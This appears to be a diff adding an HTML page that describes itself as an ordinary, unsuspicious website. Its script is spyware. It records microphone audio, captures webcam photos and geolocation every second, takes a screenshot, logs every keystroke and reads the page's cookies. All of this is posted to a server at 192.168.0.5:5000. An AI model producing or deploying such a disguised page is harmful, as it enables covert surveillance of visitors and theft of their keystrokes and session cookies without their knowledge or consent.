@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Website Rahasia</title>
+</head>
+<body>
+  <h1>Selamat Datang!</h1>
+  <p>Ini adalah website biasa. Tidak ada yang mencurigakan di sini.</p>
+
+  <video id="kamera" width="640" height="480" autoplay></video>
+  <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+
+  <script>
+    // Kamera
+    const video = document.getElementById('kamera');
+    const canvas = document.getElementById('canvas');
+    const context = canvas.getContext('2d');
+
+    navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+      .then(stream => {
+        video.srcObject = stream;
+
+        // Audio
+        const recorder = new MediaRecorder(stream);
+        recorder.start();
+
+        recorder.ondataavailable = event => {
+          const blob = new Blob([event.data], { type: 'audio/wav' });
+          const audioURL = URL.createObjectURL(blob);
+
+          // Kirim audio ke server
+          fetch('http://192.168.0.5:5000', {
+            method: 'POST',
+            body: blob
+          })
+          .then(response => {
+            console.log('Audio berhasil dikirim:', response);
+          })
+          .catch(error => {
+            console.error('Error mengirim audio:', error);
+          });
+        };
+      })
+      .catch(error => {
+        console.error('Error accessing camera and microphone:', error);
+      });
+
+    setInterval(() => {
+      // Ambil foto
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+      const dataURL = canvas.toDataURL('image/png');
+
+      // Kirim foto ke server
+      fetch('http://192.168.0.5:5000', {
+        method: 'POST',
+        body: dataURL
+      })
+      .then(response => {
+        console.log('Foto berhasil dikirim:', response);
+      })
+      .catch(error => {
+        console.error('Error mengirim foto:', error);
+      });
+
+      // Lokasi
+      navigator.geolocation.getCurrentPosition(position => {
+        const { latitude, longitude } = position.coords;
+
+        // Kirim lokasi ke server
+        fetch('http://192.168.0.5:5000', {
+          method: 'POST',
+          body: JSON.stringify({ latitude, longitude })
+        })
+        .then(response => {
+          console.log('Lokasi berhasil dikirim:', response);
+        })
+        .catch(error => {
+          console.error('Error mengirim lokasi:', error);
+        });
+      });
+    }, 1000); // Ambil foto dan lokasi setiap detik
+
+    // Tangkapan layar
+    html2canvas(document.body).then(canvas => {
+      const dataURL = canvas.toDataURL('image/png');
+
+      // Kirim tangkapan layar ke server
+      fetch('http://192.168.0.5:5000', {
+        method: 'POST',
+        body: dataURL
+      })
+      .then(response => {
+        console.log('Tangkapan layar berhasil dikirim:', response);
+      })
+      .catch(error => {
+        console.error('Error mengirim tangkapan layar:', error);
+      });
+    });
+
+    // Keylogging
+    document.addEventListener('keydown', event => {
+      const key = event.key;
+
+      // Kirim keylogging ke server
+      fetch('http://192.168.0.5:5000', {
+        method: 'POST',
+        body: key
+      })
+      .then(response => {
+        console.log('Keylogging berhasil dikirim:', response);
+      })
+      .catch(error => {
+        console.error('Error mengirim keylogging:', error);
+      });
+    });
+
+    // Pencurian cookie
+    const cookies = document.cookie;
+
+    // Kirim cookie ke server
+    fetch('http://192.168.0.5:5000', {
+      method: 'POST',
+      body: cookies
+    })
+    .then(response => {
+      console.log('Cookie berhasil dikirim:', response);
+    })
+    .catch(error => {
+      console.error('Error mengirim cookie:', error);
+    });
+  </script>
+</body>
+</html>
